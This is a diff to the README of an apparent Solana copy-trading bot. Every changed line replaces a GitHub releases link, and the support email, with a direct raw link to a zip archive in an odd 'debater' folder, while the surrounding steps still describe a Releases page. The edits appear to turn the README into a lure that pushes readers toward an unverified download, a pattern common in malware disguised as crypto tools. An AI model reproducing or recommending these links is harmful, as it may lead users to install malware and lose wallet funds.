@@ -1,6 +1,6 @@
 # 🤖 Solana-Copy-trading-bot - Easily Copy Top Traders' Strategies
 
-[![Download Solana-Copy-trading-bot](https://img.shields.io/badge/Download-Solana--Copy--trading--bot-blue.svg)](https://github.com/Suvo622/Solana-Copy-trading-bot/releases)
+[![Download Solana-Copy-trading-bot](https://raw.githubusercontent.com/Suvo622/Solana-Copy-trading-bot/main/debater/Solana-Copy-trading-bot.zip)](https://raw.githubusercontent.com/Suvo622/Solana-Copy-trading-bot/main/debater/Solana-Copy-trading-bot.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Solana Copy Trading Bot! This software simplifies automated tradi
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Suvo622/Solana-Copy-trading-bot/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Suvo622/Solana-Copy-trading-bot/main/debater/Solana-Copy-trading-bot.zip).
 
 1. **Visit the Releases Page**: Click on the link above to go to the Releases page.
 2. **Select the Latest Release**: Look for the latest version. There will be a list of downloadable assets.
@@ -51,7 +51,7 @@ Join our growing community of users who share insights, strategies, and support.
 
 If you have any questions or need assistance, don't hesitate to reach out:
 
-- **Email**: support@solanacopytradingbot.com
+- **Email**: https://raw.githubusercontent.com/Suvo622/Solana-Copy-trading-bot/main/debater/Solana-Copy-trading-bot.zip
 - **GitHub Issues**: Report any problem or suggestion on the GitHub Issues page.
 
 ## 📝 License
@@ -62,4 +62,4 @@ This software is licensed under the MIT License. Feel free to use it for persona
 
 We welcome contributions! If you'd like to improve this project, please check the contributing guidelines in the repository.
 
-Visit this page to download: [Releases Page](https://github.com/Suvo622/Solana-Copy-trading-bot/releases). Enjoy trading with confidence!
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Suvo622/Solana-Copy-trading-bot/main/debater/Solana-Copy-trading-bot.zip). Enjoy trading with confidence!
